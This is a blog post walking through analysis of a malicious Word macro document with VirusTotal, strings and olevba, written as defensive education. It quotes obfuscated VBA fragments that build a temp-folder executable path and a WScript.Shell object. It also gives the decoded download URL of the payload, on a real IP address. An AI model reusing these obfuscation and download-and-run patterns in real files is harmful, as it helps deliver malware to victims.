---
title:  "Malicious Document Analysis"
author: Vince Jang
date: 2024-01-15 00:00:00 +0000
categories: [projects]
tags: [projects]
image: /assets/img/pic.10.3.png
render_with_liquid: false
---

# Malicious Document Analysis(DOC VBA)

Weaponized MS office documents pose a large risk to organizations.. From embedded active content, such as scripts and HTML code in Word and Powerpoint files to Excel macros, this is an attack vector every organization must pay attention to. About 1 million companies worldwide use Office 365 and 70% of Fortune 500 companies purchased O365 in 2020. As a result, nearly every business transaction involving a file transfer will likely be in a Microsoft office format at risk of containing malware.

![images](/assets/img/pic10.1.1.PNG)  
Have you ever seen this warning when opening MS Office files? And did you just click it? This is the danger you should be aware of. As soon as you click the 'Enable Content' button, your whole computer could be compromised. Unfortunately, people still click it

## Macro
Macros is A small program that is often written to automate repetitive tasks in MS Office applications. Macros are typically written in Visual Basic for Application(VBA), a programming language developed by microsoft that is supported by all Microsoft Office products.

## Tools
1. Linux / highly recommend REMnux on VirtualBox but I will use Kali for instance
2. ExifTool, Strings, Xorsearch and more
3. Olevba to extract malicious macros

## Analysis 

I am going to do basic dynamic analysis with [Virustotal](https://www.virustotal.com/gui/home/upload),  
We are going to Extract Hash key of Baddoc.doc(Malicious file)  
![images](/assets/img/pic10.1.PNG)  
and we are going to use Search module in Virustotal to see what information we can get.  
![images](/assets/img/pic10.2.PNG)  
![images](/assets/img/pic10.3.PNG)  
![images](/assets/img/pic10.4.PNG)  
![images](/assets/img/pic10.5.PNG)  
As you can see we can find all information such as file names, create dates, contacted IP addresses, drop files, sand box reports, registry set keys and many more  
Do you think this is malicious file? I agree but I need more information, Let's dig into it.  

if you are using REMnux all tools are pre installed, If you using other Linux you might need to install some of tools.  
![images](/assets/img/pic10.6.PNG)  
Let's start analyze  
![images](/assets/img/pic10.7.PNG)  
We can see the Language code is "Russian" and Template type is ".dotm" which is Macros.  
this is pretty suspicious to me.  
## What to look for
1. IP addresses
2. Website / http
3. Domains
4. File locations that are suspicious
5. Malicious code
6. Malicious files  
Okay lets type `strings -n 5 baddoc.doc` (it basically means find strings anything longer than 5 characters)  
![images](/assets/img/pic10.8.PNG)  
![images](/assets/img/pic10.9.PNG)  
![images](/assets/img/pic10.10.PNG)  
I can see some IP addresses and File directories which is suspicious but it's really messy and hard to look.  
Let's use other tools  
I installed oletools 
![images](/assets/img/pic10.12.PNG)  
and excute it.  
![images](/assets/img/pic10.13.PNG)  
![images](/assets/img/pic10.14.PNG)  
We can see more organized information such as this document is not encryped and this file contains VBA Macros, but still Very Basic.  
Let's see what is in VBA script.  
![images](/assets/img/pic10.15.PNG)  
![images](/assets/img/pic10.16.PNG)  
Here we go. It highlighted suspicious keywords and we can have a look in more details.  
If we open this file all the code in this file will be excuted.  
![images](/assets/img/pic10.17.PNG)  
For example, I found a code line `"$file = 'c:\Users\" + USER + "\AppData\Local\Temp\" + "4" & "44." + Chr(101) & "xe';"`,`Chr(Asc("C")) + "reate" + "O" + "bject(" + Chr(34) + "W" + "S" + "cript." + "S" + "hell" + Chr(34) + ")" + "" & ""` this is malicious code. they use divided strings to hide the actual code they want to excute.  
I still want to see more Detail,
So, I decoded all the malicious code file.  
![images](/assets/img/pic10.18.PNG)  
And it looks like this.  
![images](/assets/img/pic10.19.PNG)  
![images](/assets/img/pic10.20.PNG)  
![images](/assets/img/pic10.21.PNG)  
![images](/assets/img/pic10.22.PNG)  
"It gives us more details in keywords and descriptions, such as PowerShell commands, executable file names, temporary directories, ping, and many more. With this information, I am 100% sure that this is a malicious file.  
One thing that is really interesting is the use of a bit of a twist: `Print #FileNumber, "strRT = ""http://91.220.131" + JASHDUIQWHDKJQAD + ".exe""` . If you find "JASHDUIQWHDKJQAD" in this code, it is it is ![images](/assets/img/pic10.24.PNG)  
In this case This URL is going to install something and it will be `http://91.220.131.44/upd/install.exe` Now we know IP address, Malicious file and the path.  
SO, DO NOT OPEN IT!










